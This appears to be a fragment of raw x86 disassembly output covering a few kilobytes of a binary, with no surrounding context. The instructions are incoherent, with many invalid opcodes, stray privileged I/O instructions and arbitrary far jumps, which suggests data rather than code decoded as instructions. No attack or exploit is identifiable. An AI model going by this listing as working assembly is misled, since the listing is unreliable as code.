  414b8c:	sub    al,0x8c
  414b8e:	xchg   ebp,eax
  414b8f:	pop    ebp
  414b90:	in     eax,dx
  414b91:	cld    
  414b92:	vpcomud xmm14,xmm0,XMMWORD PTR [edi+0x4c],0xd
  414b99:	test   al,0xe8
  414b9b:	(bad)  
  414b9c:	mov    ah,0xd7
  414b9e:	sti    
  414b9f:	mov    ecx,0x53b311f3
  414ba4:	rol    BYTE PTR [ebx+0x3e8fcfab],1
  414baa:	mov    ds:0x8b4cf444,al
  414baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb0:	xchg   ebx,eax
  414bb1:	jno    0x414b3b
  414bb3:	ret    0xc126
  414bb6:	push   es
  414bb7:	xchg   DWORD PTR [esi+edx*2-0x32],esp
  414bbb:	mov    ebx,0x6ae6b2f4
  414bc0:	dec    ebp
  414bc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc2:	add    DWORD PTR fs:[edi-0xa397352],ecx
  414bc9:	xor    esi,0xc729ab56
  414bcf:	xor    eax,0x31bff780
  414bd4:	mov    bl,0x2c
  414bd6:	mov    ebp,0xc0211712
  414bdb:	jle    0x414b70
  414bdd:	mov    eax,ds:0xab9a8386
  414be2:	push   esp
  414be3:	add    eax,0x95a92eaf
  414be8:	push   ecx
  414be9:	lea    esp,[ebp-0x14381a8d]
  414bef:	les    esi,FWORD PTR [esi-0x30]
  414bf2:	mul    BYTE PTR [esi-0x3dd6f9c]
  414bf8:	in     al,0xa5
  414bfa:	add    ah,BYTE PTR [ecx+edi*4-0x30]
  414bfe:	pop    eax
  414bff:	or     edx,DWORD PTR [ecx]
  414c01:	(bad)  
  414c02:	mov    BYTE PTR [esi+0x5e],0x2f
  414c06:	fisub  WORD PTR [eax-0x198ec6a7]
  414c0c:	mov    ds:0xcba09a72,eax
  414c11:	out    dx,eax
  414c12:	jne    0x414c00
  414c14:	cbw    
  414c16:	sti    
  414c17:	push   cs
  414c18:	fisttp QWORD PTR ds:0x99a4350d
  414c1e:	shr    BYTE PTR ds:0x94f634b7,cl
  414c24:	call   0x32704c7e
  414c29:	retf   
  414c2a:	int    0x5e
  414c2c:	mov    ds:0x5a0e8ca6,al
  414c31:	sbb    esp,DWORD PTR ds:0x80ba826b
  414c37:	arpl   si,ax
  414c39:	scas   eax,DWORD PTR es:[edi]
  414c3a:	mov    edx,0xc5d50f70
  414c3f:	add    BYTE PTR [esi],dl
  414c41:	mov    ebx,0x214eb7cf
  414c46:	fbld   TBYTE PTR [ebp+0x79a1efba]
  414c4c:	jg     0x414c86
  414c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c4f:	jo     0x414cbf
  414c51:	scas   eax,DWORD PTR es:[edi]
  414c52:	dec    ebp
  414c53:	sbb    al,0x92
  414c55:	sahf   
  414c56:	push   edi
  414c57:	or     al,0xe9
  414c59:	push   ecx
  414c5a:	jbe    0x414c0f
  414c5c:	or     BYTE PTR [esi-0x17],bh
  414c5f:	inc    eax
  414c60:	sub    eax,0x891f5bbf
  414c65:	jmp    0x391e:0xf1280d7d
  414c6c:	icebp  
  414c6d:	fs imul edi
  414c70:	cmp    esp,ebx
  414c72:	mov    ah,0xae
  414c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c75:	push   ss
  414c76:	or     BYTE PTR [ecx-0x3df6d939],bl
  414c7c:	inc    ebp
  414c7d:	test   eax,0xcbaa976e
  414c82:	mov    ebx,0xb0c1f790
  414c87:	push   edx
  414c88:	adc    cl,0x6a
  414c8b:	lea    ecx,[esp+ecx*8]
  414c8e:	loope  0x414c58
  414c90:	dec    edi
  414c91:	stos   BYTE PTR es:[edi],al
  414c92:	jmp    0x414ca0
  414c94:	push   esi
  414c95:	xchg   ebx,eax
  414c96:	ja     0x414cf9
  414c98:	xchg   esp,eax
  414c99:	xor    al,0x9c
  414c9b:	sub    DWORD PTR [eax],edx
  414c9d:	sub    edx,0xffffffec
  414ca0:	inc    ecx
  414ca1:	rcl    dh,0x93
  414ca4:	retf   
  414ca5:	and    eax,0xd3944636
  414caa:	scas   eax,DWORD PTR es:[edi]
  414cab:	and    bl,BYTE PTR [eax-0x41]
  414cae:	xchg   ebp,eax
  414caf:	out    dx,al
  414cb0:	dec    esp
  414cb1:	outs   dx,BYTE PTR ds:[esi]
  414cb2:	outs   dx,BYTE PTR ds:[esi]
  414cb3:	inc    ebp
  414cb4:	dec    edx
  414cb5:	add    eax,DWORD PTR [edi+0x44a46d6a]
  414cbb:	sahf   
  414cbc:	jbe    0x414cf0
  414cbe:	loopne 0x414d05
  414cc0:	or     eax,0xd804c5ce
  414cc5:	cmp    BYTE PTR [edx],cl
  414cc7:	mov    dh,0x22
  414cc9:	ds in  eax,dx
  414ccb:	inc    edi
  414ccc:	lahf   
  414ccd:	inc    eax
  414cce:	jmp    0xae8de35d
  414cd3:	mov    eax,0x6c5065ab
  414cd8:	pop    esp
  414cd9:	mov    ebx,0x34bda1c2
  414cde:	and    dl,ch
  414ce0:	cdq    
  414ce1:	push   edi
  414ce2:	mov    edx,0x10d05b68
  414ce7:	loope  0x414d1b
  414ce9:	dec    esp
  414cea:	jmp    0xd333:0xde27b9ba
  414cf1:	and    eax,0x1c0d9a5d
  414cf6:	arpl   WORD PTR [ebp-0x712a374c],bp
  414cfc:	jne    0x414d53
  414cfe:	aaa    
  414cff:	jmp    0xc247e847
  414d04:	pop    ds
  414d05:	test   al,0x52
  414d07:	dec    edi
  414d08:	xor    al,0xff
  414d0a:	cmp    DWORD PTR [edi+esi*4-0x60],esi
  414d0e:	loop   0x414cd6
  414d10:	inc    edi
  414d11:	xchg   edi,eax
  414d12:	mov    dl,0x4b
  414d14:	inc    edi
  414d15:	ret    0xf440
  414d18:	sbb    al,0xdf
  414d1a:	aam    0x74
  414d1c:	push   cs
  414d1d:	pop    esi
  414d1e:	outs   dx,BYTE PTR ds:[esi]
  414d1f:	dec    edx
  414d20:	jne    0x414cfe
  414d22:	dec    esp
  414d23:	mov    cl,0x68
  414d25:	out    0x7d,al
  414d27:	mov    cl,BYTE PTR [ecx-0x5d]
  414d2a:	aad    0xaf
  414d2c:	pop    ebx
  414d2d:	pop    edx
  414d2e:	or     eax,0x2f4dd62
  414d33:	out    dx,eax
  414d34:	dec    ecx
  414d35:	or     esp,esi
  414d37:	mov    esi,0xd12c130b
  414d3c:	inc    eax
  414d3d:	cs clc 
  414d3f:	and    DWORD PTR [edi],esp
  414d41:	add    edi,esi
  414d43:	sub    BYTE PTR [esi+0x74681347],bl
  414d49:	pop    ds
  414d4a:	inc    eax
  414d4b:	call   0xc1a97b80
  414d50:	push   cs
  414d51:	retf   0x3fad
  414d54:	sbb    al,0x8d
  414d56:	cmp    al,0xc9
  414d58:	cld    
  414d59:	push   es
  414d5a:	and    dl,BYTE PTR [esp+0x113a8905]
  414d61:	pop    DWORD PTR [edi]
  414d63:	in     al,dx
  414d64:	rcr    DWORD PTR [edi+0x70],cl
  414d67:	push   edx
  414d68:	xchg   ecx,eax
  414d69:	retf   
  414d6a:	xor    eax,0x49f8f603
  414d6f:	dec    ecx
  414d70:	sahf   
  414d71:	mov    WORD PTR [edx],fs
  414d73:	pop    eax
  414d74:	xchg   edi,eax
  414d75:	out    0xcb,al
  414d77:	push   edi
  414d78:	ret    
  414d79:	test   eax,0x15cddd04
  414d7e:	dec    ecx
  414d7f:	shl    DWORD PTR [edi],0x16
  414d82:	aam    0x78
  414d84:	stc    
  414d85:	add    BYTE PTR [eax],cl
  414d87:	in     al,0x81
  414d89:	into   
  414d8a:	adc    al,0x88
  414d8c:	(bad)  
  414d8d:	repnz lods al,BYTE PTR ds:[esi]
  414d8f:	xchg   ebx,eax
  414d90:	inc    ecx
  414d91:	imul   ecx,DWORD PTR [ecx-0x1b5dd10],0x43
  414d98:	ror    eax,cl
  414d9a:	sub    BYTE PTR [edx+eiz*8+0x25c9795],bl
  414da1:	retf   0x356f
  414da4:	lods   eax,DWORD PTR ds:[esi]
  414da5:	mov    ds:0x6c8be275,al
  414daa:	push   ecx
  414dab:	jecxz  0x414e1d
  414dad:	pop    esp
  414dae:	push   edx
  414daf:	add    eax,DWORD PTR [eax-0x7d5cd2b]
  414db5:	sbb    ah,0x2d
  414db8:	in     eax,dx
  414db9:	ret    
  414dba:	cwd    
  414dbc:	or     bl,BYTE PTR [ebx-0x11]
  414dbf:	jg     0x414e05
  414dc1:	in     al,dx
  414dc2:	add    edx,DWORD PTR [edi-0x3c]
  414dc5:	cld    
  414dc6:	pop    edx
  414dc7:	outs   dx,DWORD PTR ds:[esi]
  414dc8:	hlt    
  414dc9:	dec    ecx
  414dca:	das    
  414dcb:	push   ds
  414dcc:	mov    edi,DWORD PTR [edi+0x2a]
  414dcf:	jge    0x414e3b
  414dd1:	out    0xd7,al
  414dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dd4:	dec    ebp
  414dd5:	adc    al,0x67
  414dd7:	enter  0xb75c,0xbf
  414ddb:	out    dx,eax
  414ddc:	add    bh,BYTE PTR [eax-0x4c832b27]
  414de2:	push   edx
  414de3:	popf   
  414de4:	in     eax,0x25
  414de6:	dec    esi
  414de7:	mov    ebx,0x1f5f36aa
  414dec:	xchg   ecx,eax
  414ded:	lahf   
  414dee:	xlat   BYTE PTR ds:[ebx]
  414def:	aad    0xaf
  414df1:	stos   BYTE PTR es:[edi],al
  414df2:	aas    
  414df3:	out    dx,al
  414df4:	mov    edi,0xd6aed85e
  414df9:	stos   DWORD PTR es:[edi],eax
  414dfa:	adc    DWORD PTR [ecx-0x513f0639],ebp
  414e00:	push   ebp
  414e01:	cmp    eax,0x2105c10a
  414e06:	pusha  
  414e07:	pop    ebp
  414e08:	sbb    al,cl
  414e0a:	jnp    0x414e0a
  414e0c:	out    0xc,eax
  414e0e:	or     DWORD PTR [ebp+ecx*1+0x37],ebp
  414e12:	xor    DWORD PTR [ebp+0x23a76809],0xe1b2df1e
  414e1c:	and    esp,edi
  414e1e:	mov    ebp,0xc9214c42
  414e23:	mov    BYTE PTR ds:0x90896888,cl
  414e29:	cmp    edx,DWORD PTR [edi]
  414e2b:	stos   DWORD PTR es:[edi],eax
  414e2c:	sub    eax,0xeb86dc46
  414e31:	lfs    edi,FWORD PTR [esp+ecx*4]
  414e35:	xchg   esp,eax
  414e36:	push   esi
  414e37:	adc    bh,0x21
  414e3a:	loopne 0x414eac
  414e3c:	scas   al,BYTE PTR es:[edi]
  414e3d:	or     DWORD PTR [eax+0x202ffaaf],ebp
  414e43:	add    eax,0x28430118
  414e48:	xor    DWORD PTR [esi-0x42ea5541],ecx
  414e4e:	dec    edx
  414e4f:	sub    al,0x3
  414e51:	ret    0x49c8
  414e54:	mov    al,0x15
  414e56:	xchg   ebp,eax
  414e57:	inc    ebp
  414e58:	jb     0x414dfb
  414e5a:	outs   dx,DWORD PTR ds:[esi]
  414e5b:	and    DWORD PTR [ebx+esi*2+0x20],edi
  414e5f:	push   0xffffffa1
  414e61:	mov    ds:0x5179309a,al
  414e66:	rcl    ch,1
  414e68:	and    eax,0xe527f75b
  414e6d:	adc    esi,esp
  414e6f:	jb     0x414e0b
  414e71:	inc    edi
  414e72:	jae    0x414ea5
  414e74:	mov    bl,ah
  414e76:	in     eax,0x84
  414e78:	retf   
  414e79:	clc    
  414e7a:	inc    edi
  414e7b:	xor    BYTE PTR [esi-0x423a693e],dl
  414e81:	stos   BYTE PTR es:[edi],al
  414e82:	mov    ecx,0x52fd0bad
  414e87:	(bad)  
  414e88:	(bad)
  414e8b:	lds    esp,FWORD PTR [ebx+ebp*2+0x6d]
  414e8f:	mov    ch,0x22
  414e91:	xchg   esp,eax
  414e92:	push   edi
  414e93:	imul   ebp,DWORD PTR [esi-0x2362e2e9],0xfffffff8
  414e9a:	enter  0xb96,0xd7
  414e9e:	mov    DWORD PTR [ecx-0x73],edi
  414ea1:	mov    fs,WORD PTR [eax+0x31]
  414ea4:	mov    DWORD PTR [esi+0xeff8f62],0xb3e159fb
  414eae:	xor    eax,0xafdcfb01
  414eb3:	jo     0x414e86
  414eb5:	repz sub DWORD PTR [edx+0x4a],edi
  414eb9:	retf   
  414eba:	arpl   WORD PTR [ecx+0x11],bp
  414ebd:	retf   
  414ebe:	inc    ebp
  414ebf:	pushf  
  414ec0:	pop    ss
  414ec1:	mov    bh,0xa6
  414ec3:	mov    ebx,DWORD PTR [ebx+0x6c84eee0]
  414ec9:	adc    dh,ch
  414ecb:	sbb    dl,BYTE PTR [ecx+esi*8+0x67]
  414ecf:	je     0x414f31
  414ed1:	push   esp
  414ed2:	cmp    edx,DWORD PTR [esi-0x63]
  414ed5:	sub    BYTE PTR ds:0x4c7255fa,bl
  414edb:	pop    ebx
  414edc:	(bad)  
  414edd:	mul    DWORD PTR [edi+eiz*8+0x4a]
  414ee1:	jno    0x414e68
  414ee3:	mov    ch,0xba
  414ee5:	sub    eax,0x3130b09b
  414eea:	pop    edx
  414eeb:	sub    al,0xc3
  414eed:	loop   0x414f55
  414eef:	fnstenv [edi+0x7c15d3d3]
  414ef5:	mov    ebx,ebp
  414ef7:	adc    esp,DWORD PTR [edx+0x4c34e787]
  414efd:	xchg   DWORD PTR [ebx-0x13],ecx
  414f00:	add    DWORD PTR [eax+0x79],edi
  414f03:	push   ecx
  414f04:	xchg   BYTE PTR [ebp-0x2c],cl
  414f07:	cmp    eax,0xd6f80789
  414f0c:	stc    
  414f0d:	cmp    esp,edx
  414f0f:	cmp    al,0xc1
  414f11:	ret    
  414f12:	mov    ebp,0xd6b90630
  414f17:	fnstenv [ebx]
  414f19:	xchg   ecx,eax
  414f1a:	imul   eax,DWORD PTR [eax+0x352d914d],0xffffffd8
  414f21:	adc    eax,0x2570524
  414f26:	hlt    
  414f27:	call   0xe551acb4
  414f2c:	(bad)  
  414f2d:	mov    eax,DWORD PTR [eax+ebp*2]
  414f30:	gs dec edx
  414f32:	push   esi
  414f33:	pop    ss
  414f34:	nop
  414f35:	jb     0x414f92
  414f37:	in     eax,0xc
  414f39:	mov    WORD PTR [esi-0x2d],gs
  414f3c:	mov    ebp,0x92658705
  414f41:	pop    eax
  414f42:	xor    eax,0xd325ce73
  414f47:	mov    ch,0x4
  414f49:	xor    dh,bl
  414f4b:	sub    al,0xe3
  414f4d:	pop    ecx
  414f4e:	popa   
  414f4f:	lea    ebx,[eax]
  414f51:	xchg   esp,eax
  414f52:	adc    al,0x2
  414f54:	out    0xc4,eax
  414f56:	push   0xffffffd6
  414f58:	in     eax,0x1d
  414f5a:	loope  0x414f3d
  414f5c:	stos   BYTE PTR es:[edi],al
  414f5d:	adc    dl,BYTE PTR [ebx+esi*4+0x33965ba1]
  414f64:	fmul   QWORD PTR [ebp+eiz*2-0x220f1f]
  414f6b:	jmp    0xc0ce5d75
  414f70:	leave  
  414f71:	bound  edi,QWORD PTR ds:0x2a376758
  414f77:	ret    0xab9d
  414f7a:	das    
  414f7b:	lahf   
  414f7c:	jg     0x414f50
  414f7e:	dec    eax
  414f7f:	cmp    ecx,DWORD PTR [ecx+0x9]
  414f82:	rcl    BYTE PTR [edi],cl
  414f84:	aam    0x3c
  414f86:	cs sti 
  414f88:	clc    
  414f89:	mov    dh,0xe1
  414f8b:	push   ebp
  414f8c:	sti    
  414f8d:	(bad)  
  414f8e:	xchg   edx,eax
  414f8f:	jno    0x414f43
  414f91:	fwait
  414f92:	pop    edx
  414f93:	rol    esp,0x2c
  414f96:	add    BYTE PTR [edi],ch
  414f98:	xchg   ebp,eax
  414f99:	sbb    al,0x14
  414f9b:	push   eax
  414f9c:	loope  0x415005
  414f9e:	jnp    0x414f52
  414fa0:	push   eax
  414fa1:	add    DWORD PTR [ebx],esp
  414fa3:	sahf   
  414fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fa5:	pop    ebp
  414fa6:	loope  0x415013
  414fa8:	imul   BYTE PTR [ebp-0x3b]
  414fab:	add    DWORD PTR [edx+ebp*2+0x49],ecx
  414faf:	sub    ebx,DWORD PTR [eax-0x245e40b0]
  414fb5:	into   
  414fb6:	sbb    DWORD PTR [edi-0x62b1194a],esp
  414fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fbd:	arpl   WORD PTR [esi-0x4f],cx
  414fc0:	in     eax,dx
  414fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fc2:	ins    BYTE PTR es:[edi],dx
  414fc3:	clc    
  414fc4:	add    eax,0x3c95a201
  414fc9:	ja     0x415006
  414fcb:	mov    edi,0xe1a8c544
  414fd0:	adc    DWORD PTR [ebp-0x63],ebp
  414fd3:	addr16 (bad) 
  414fd5:	loope  0x415050
  414fd7:	mov    esi,0xb63bc9ce
  414fdc:	pop    ds
  414fdd:	int3   
  414fde:	(bad)  
  414fdf:	and    dl,ah
  414fe1:	int    0xcc
  414fe3:	push   ecx
  414fe4:	sub    BYTE PTR [edi+eax*2],cl
  414fe7:	mov    ds:0x71d1f8b1,al
  414fec:	mov    eax,ds:0xeb3fe4df
  414ff1:	jnp    0x415025
  414ff3:	pusha  
  414ff4:	sbb    DWORD PTR [edx+0x191745d7],ebp
  414ffa:	inc    esi
  414ffb:	inc    esp
  414ffc:	push   esp
  414ffd:	sti    
  414ffe:	or     eax,0xac19d72b
  415003:	in     eax,dx
  415004:	(bad)  
  415005:	out    0x89,eax
  415007:	jbe    0x414ff2
  415009:	add    eax,0xc3c79652
  41500e:	inc    edx
  41500f:	mov    WORD PTR [ecx-0xbf52c78],fs
  415015:	add    esp,DWORD PTR [ebx+0x16]
  415018:	mov    esi,0x1ae56a58
  41501d:	add    DWORD PTR ds:0x4bed18ad,ecx
  415023:	pop    ebp
  415024:	(bad)  
  415025:	pop    esi
  415026:	inc    ebp
  415027:	rol    BYTE PTR [edi+eax*1+0x25],cl
  41502b:	pusha  
  41502c:	cld    
  41502d:	mov    eax,0xa3d30c96
  415032:	aam    0xc6
  415034:	std    
  415035:	dec    ecx
  415036:	lahf   
  415037:	into   
  415038:	xchg   esi,eax
  415039:	data16 or BYTE PTR [ebp+0x27],cl
  41503d:	inc    eax
  41503e:	mov    ?,WORD PTR [ebx+0x6e41c7b]
  415044:	ins    DWORD PTR es:[edi],dx
  415045:	aaa    
  415046:	push   0xa98d77e4
  41504b:	cmp    eax,DWORD PTR ds:0x5a3c679f
  415051:	ret    
  415052:	cmp    DWORD PTR [eax+0xa],0xa382d4a4
  415059:	xor    DWORD PTR gs:[edx-0x5c],edi
  41505d:	xlat   BYTE PTR ds:[ebx]
  41505e:	test   al,0x8
  415060:	adc    cl,bl
  415062:	mov    cl,0x36
  415064:	xlat   BYTE PTR ds:[ebx]
  415065:	mov    edx,0x50405718
  41506a:	push   esi
  41506b:	push   ecx
  41506c:	stos   BYTE PTR es:[edi],al
  41506d:	push   ebp
  41506e:	call   0x33d6:0x60bb79a4
  415075:	fistp  WORD PTR [esi-0xc]
  415078:	mov    ebp,0x55b2656a
  41507d:	bound  ebx,QWORD PTR [esi-0x3e]
  415080:	lods   eax,DWORD PTR ds:[esi]
  415081:	popf   
  415082:	jmp    0x4150c1
  415084:	addr16 mov cl,0x1c
  415087:	mov    gs,WORD PTR [esi-0x6a2d5acb]
  41508d:	and    esi,DWORD PTR [eax-0x68]
  415090:	ds pop ecx
  415092:	add    DWORD PTR [ebx],edi
  415094:	push   eax
  415095:	test   eax,0x1a1f5eba
  41509a:	xor    ebp,DWORD PTR [edi+0x5648100c]
  4150a0:	sub    ebx,ebp
  4150a2:	xor    esi,DWORD PTR [ebx+0x74]
  4150a5:	push   esp
  4150a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a7:	mov    ch,0x97
  4150a9:	push   es
  4150aa:	pop    ds
  4150ab:	inc    edi
  4150ac:	lds    ebx,FWORD PTR [ebp-0x4e7b4b0b]
  4150b2:	push   cs
  4150b3:	leave  
  4150b4:	jae    0x4150cb
  4150b6:	(bad)  
  4150b8:	imul   esi,DWORD PTR [ebp+0x5d],0x55
  4150bc:	sahf   
  4150bd:	sub    BYTE PTR [edi-0x3c],0x8e
  4150c1:	jne    0x4150c1
  4150c3:	pusha  
  4150c4:	loop   0x41511d
  4150c6:	imul   ebx,DWORD PTR ss:[ebx+0x60],0x68221847
  4150ce:	mov    BYTE PTR [edx],cl
  4150d0:	sbb    al,0x23
  4150d2:	add    bh,BYTE PTR [eax+0x760b5d13]
  4150d8:	mov    ss,WORD PTR [eax]
  4150da:	daa    
  4150db:	jge    0x415084
  4150dd:	ficom  DWORD PTR [ecx]
  4150df:	xor    BYTE PTR [edx-0x540c3947],0x3
  4150e6:	xor    DWORD PTR [edi-0x5722461f],ecx
  4150ec:	push   ecx
  4150ed:	cli    
  4150ee:	dec    eax
  4150ef:	std    
  4150f0:	mov    WORD PTR [ecx+0x0],gs
  4150f3:	mov    ds:0xe200d941,al
  4150f8:	and    dl,BYTE PTR [esi+0x2d]
  4150fb:	test   al,0x93
  4150fd:	fisttp DWORD PTR [eax]
  4150ff:	lock cmp eax,edi
  415102:	dec    edi
  415103:	push   0x48deb42
  415108:	xchg   edi,eax
  415109:	int    0xb1
  41510b:	adc    BYTE PTR [ebx-0x23],cl
  41510e:	xchg   edx,eax
  41510f:	sub    DWORD PTR [eax],0x50
  415112:	pop    ecx
  415113:	xchg   edi,eax
  415114:	daa    
  415115:	add    eax,0x5af7150f
  41511a:	cli    
  41511b:	sub    al,0x1
  41511d:	ins    DWORD PTR es:[edi],dx
  41511e:	xchg   esi,eax
  41511f:	jl     0x4150e1
  415121:	add    bh,BYTE PTR [ebx+0x41]
  415124:	jo     0x4150eb
  415126:	imul   esp,DWORD PTR [ebp+0x76f0ca5],0x34
  41512d:	jp     0x415164
  41512f:	ret    
  415130:	or     eax,0xd6bca02a
  415135:	mov    ecx,0xc1b06f37
  41513a:	in     eax,0x21
  41513c:	mov    bh,0xc9
  41513e:	jns    0x415138
  415140:	fwait
  415141:	xor    al,0xac
  415143:	scas   al,BYTE PTR es:[edi]
  415144:	add    edx,DWORD PTR ss:[eax]
  415147:	sti    
  415148:	mul    BYTE PTR [edi+0x1fd8b602]
  41514e:	mov    ds:0xf88eb099,eax
  415153:	(bad)  
  415154:	and    al,0x4e
  415156:	inc    edx
  415157:	xchg   ebp,eax
  415158:	sbb    al,0x3d
  41515a:	xchg   edx,eax
  41515b:	lods   eax,DWORD PTR ds:[esi]
  41515c:	fstp   QWORD PTR [esp+ebx*1-0x1b]
  415160:	test   al,0xc4
  415163:	xor    cl,bh
  415165:	and    esi,DWORD PTR [edx-0x1a3ef87d]
  41516b:	mov    al,0x87
  41516d:	loope  0x415175
  41516f:	mov    BYTE PTR [edi],bh
  415171:	aad    0x24
  415173:	pslld  mm6,mm0
  415176:	into   
  415177:	call   0xd3f6:0x29a1601b
  41517e:	arpl   WORD PTR [eax-0x35f30174],sp
  415184:	les    ebp,FWORD PTR [edi]
  415186:	or     eax,0x5dfaf5f6
  41518b:	mov    eax,ds:0x9a3a2d24
  415190:	inc    esi
  415191:	mov    dh,0xab
  415193:	or     dl,BYTE PTR [ecx+ebp*8+0x68d1d48]
  41519a:	cmp    ch,0x26
  41519d:	sub    al,dl
  41519f:	in     eax,dx
  4151a0:	lock xor dh,dh
  4151a3:	scas   al,BYTE PTR es:[edi]
  4151a4:	push   cs
  4151a5:	push   esi
  4151a6:	or     DWORD PTR ds:0xd5a4a4c6,edi
  4151ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ad:	inc    ebp
  4151ae:	or     al,0xfe
  4151b0:	mov    eax,0xb0e30f6b
  4151b5:	retf   
  4151b6:	sub    al,0x3
  4151b8:	mov    ch,0x6d
  4151ba:	imul   edx,DWORD PTR [ebx],0xd3abc351
  4151c0:	mov    al,0x99
  4151c2:	push   ss
  4151c3:	out    0x2f,eax
  4151c5:	push   ss
  4151c6:	mov    eax,ds:0x66368005
  4151cb:	xlat   BYTE PTR ds:[ebx]
  4151cc:	inc    esp
  4151cd:	inc    esi
  4151ce:	cli    
  4151cf:	and    ebp,0x63
  4151d2:	xchg   edi,eax
  4151d3:	mov    bl,0xf8
  4151d5:	mov    WORD PTR [edi-0x3a],cs
  4151d8:	in     eax,0xa
  4151da:	das    
  4151db:	add    dh,dh
  4151dd:	and    ecx,DWORD PTR [ecx]
  4151df:	retf   0x2d64
  4151e2:	lahf   
  4151e3:	fbstp  TBYTE PTR [edi-0x280e5060]
  4151e9:	pop    ds
  4151ea:	clc    
  4151eb:	retf   
  4151ec:	push   edi
  4151ed:	push   0xffffffb8
  4151ef:	and    BYTE PTR [edi],ah
  4151f1:	mov    ebx,0x7904df62
  4151f6:	sbb    esp,DWORD PTR [ecx+ecx*1+0x9682157]
  4151fd:	pop    edi
  4151fe:	or     cl,BYTE PTR [edi+0x7a]
  415201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415202:	sub    eax,0xbc0cc195
  415207:	fnstenv [esi+ecx*2]
  41520a:	daa    
  41520b:	jae    0x415217
  41520d:	call   0x6a35:0xd2039ee3
  415214:	cld    
  415215:	push   ebx
  415216:	dec    DWORD PTR [eax+ecx*8]
  415219:	and    al,0xd5
  41521b:	jle    0x4151cf
  41521d:	xchg   esp,ebp
  41521f:	rcr    eax,0xc8
  415222:	fmul   st(0),st
  415224:	pop    edi
  415225:	mov    ah,0x6b
  415227:	mov    ch,0x6c
  415229:	cmp    DWORD PTR [eax+0x57],edx
  41522c:	mov    ch,BYTE PTR [esp+ebx*8-0x5ef9218d]
  415233:	jle    0x41524b
  415235:	jo     0x4152a7
  415237:	jecxz  0x4151ca
  415239:	jmp    0x415238
  41523b:	or     al,0x0
  41523d:	je     0x41521e
  41523f:	sbb    ebx,DWORD PTR [esi+0x7]
  415242:	adc    edi,ebp
  415244:	ret    
  415245:	in     al,0xed
  415247:	fmul   st(3),st
  415249:	xchg   DWORD PTR [eax],eax
  41524b:	or     ebx,ebp
  41524d:	aas    
  41524e:	adc    al,0x3f
  415250:	(bad)  [edx+eax*8-0x45b8a4db]
  415257:	mov    eax,ds:0xe0f0f20e
  41525c:	jno    0x41521b
  41525e:	push   edi
  41525f:	pop    ecx
  415260:	and    al,0x2
  415262:	add    bl,dl
  415264:	dec    edx
  415265:	mov    eax,DWORD PTR [ebp+0x377685df]
  41526b:	in     al,0x30
  41526d:	or     al,0x7f
  41526f:	adc    esi,DWORD PTR [ecx]
  415271:	sbb    eax,0xca4f42cd
  415276:	mov    ?,WORD PTR [esi-0x56]
  415279:	add    al,0x15
  41527b:	in     al,dx
  41527c:	rol    DWORD PTR ds:0x58ed09bf,0x3f
  415283:	mov    ds:0xfb498042,eax
  415288:	sub    DWORD PTR [ecx+0x63],edi
  41528b:	xchg   edi,eax
  41528c:	mov    bh,0xd6
  41528e:	dec    esi
  41528f:	stos   DWORD PTR es:[edi],eax
  415290:	enter  0x97be,0x85
  415294:	addr16 push edx
  415296:	jle    0x4152f2
  415298:	dec    esi
  415299:	add    eax,0xcd1ab0b7
  41529e:	pop    eax
  41529f:	les    esp,FWORD PTR [eax-0x10de49a3]
  4152a5:	jb     0x4152f0
  4152a7:	dec    ebx
  4152a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152a9:	mov    ebp,0xe8bdf7b4
  4152ae:	enter  0x3f7,0x36
  4152b2:	ficom  WORD PTR [edx-0x63]
  4152b5:	push   edx
  4152b6:	mov    esi,DWORD PTR [esi-0x31a605fd]
  4152bc:	xchg   ebp,eax
  4152bd:	fcmovnu st,st(2)
  4152bf:	cmp    BYTE PTR [eax+0x5076dd22],cl
  4152c5:	mov    esp,0x9778c9aa
  4152ca:	jecxz  0x415256
  4152cc:	out    0x7c,eax
  4152ce:	dec    ebx
  4152cf:	daa    
  4152d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152d1:	ins    BYTE PTR es:[edi],dx
  4152d2:	aam    0x4c
  4152d4:	and    DWORD PTR [ecx+0x73f353a8],ebp
  4152da:	sbb    BYTE PTR [eax+edi*8-0x75],bl
  4152de:	sub    al,0x47
  4152e0:	dec    edi
  4152e1:	inc    esp
  4152e2:	cmp    dl,BYTE PTR ss:[edi+0x4b]
  4152e6:	sbb    bl,dh
  4152e8:	ss dec esp
  4152ea:	dec    ecx
  4152eb:	imul   ecx,ebp,0xffffffa9
  4152ee:	xlat   BYTE PTR ds:[ebx]
  4152ef:	(bad)  
  4152f0:	mov    edi,0x8f87e453
  4152f5:	push   ebp
  4152f6:	imul   ebp,DWORD PTR [ebp+0xd],0xffffffb2
  4152fa:	xchg   esp,eax
  4152fb:	or     al,0xd
  4152fd:	push   0xbfecd7f6
  415302:	xchg   BYTE PTR [eax],dh
  415304:	clc    
  415305:	retf   0xda7a
  415308:	ffreep st(1)
  41530a:	bound  ebx,QWORD PTR [eax]
  41530c:	add    eax,0xfdecceba
  415311:	mov    edi,ebp
  415313:	add    ah,dl
  415315:	mov    ebx,0xa284410
  41531a:	ds jbe 0x4152b1
  41531d:	jle    0x415354
  41531f:	arpl   ax,sp
  415321:	mov    ds:0xdbd4811a,al
  415326:	lea    edi,[edi+0x6c6548d8]
  41532c:	imul   esp,DWORD PTR [eax+edi*1+0x421694b1],0x2da71da5
  415337:	into   
  415338:	(bad)  
  415339:	push   esp
  41533a:	jg     0x41539d
  41533c:	mov    ebx,0x241a812
  415341:	in     al,0xa9
  415343:	inc    esp
  415344:	adc    esp,ecx
  415346:	lahf   
  415347:	jbe    0x415318
  415349:	pusha  
  41534a:	dec    ebx
  41534b:	xor    ecx,DWORD PTR [edi+0x4dcd43db]
  415351:	sub    DWORD PTR [ebp+0x64],ecx
  415354:	mov    ebx,0x79a321f5
